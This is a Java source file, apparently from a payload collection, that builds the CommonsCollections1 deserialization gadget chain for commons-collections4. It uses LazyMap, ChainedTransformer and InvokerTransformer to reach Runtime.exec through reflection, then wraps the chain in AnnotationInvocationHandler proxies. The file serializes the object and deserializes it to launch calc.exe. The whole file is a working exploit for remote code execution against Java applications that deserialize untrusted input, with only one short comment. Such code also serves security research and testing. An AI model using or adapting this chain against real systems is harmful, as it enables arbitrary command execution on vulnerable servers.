package org.payload.cc.CC1;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1CC4LazyMap {
    public static  void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"C:\\Windows\\System32\\calc.exe"}),
                new ConstantTransformer(1)};
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};

        Transformer transformerChain = new ChainedTransformer(transformers);
        HashMap<String, String> inner = new HashMap();
        //inner.put("test", "test");
        Map lz = LazyMap.lazyMap(inner, transformerChain);
//        Class clz = Class.forName("org.apache.commons.collections4.map.LazyMap");
//        Constructor con = clz.getDeclaredConstructor(Map.class, Transformer.class);
//        con.setAccessible(true);
//        Map lz = (Map) con.newInstance(inner, transformerChain);
//        lz.get("test");


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        Class<?>[] cls = lz.getClass().getInterfaces();

        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lz);
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[] {Map.class},
                handler);
        //触发点是AnnotationInvocationHandler的readObject 所以还需要AnnotationInvocationHandler包装
        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler1);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

    }
}
